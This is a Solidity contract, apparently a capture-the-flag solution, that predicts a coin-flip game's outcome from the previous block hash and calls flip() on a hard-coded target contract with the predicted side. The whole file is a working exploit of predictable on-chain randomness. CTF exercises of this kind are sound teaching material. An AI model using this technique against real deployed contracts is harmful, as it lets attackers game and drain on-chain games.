// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./ILAUNCHPAD.sol";

contract todaysCTF {
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function callFlip() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        ILAUNCHPAD(0xd7B037b34c759a3546a3643B3f8800eed0008b79).flip(side);
    }
}
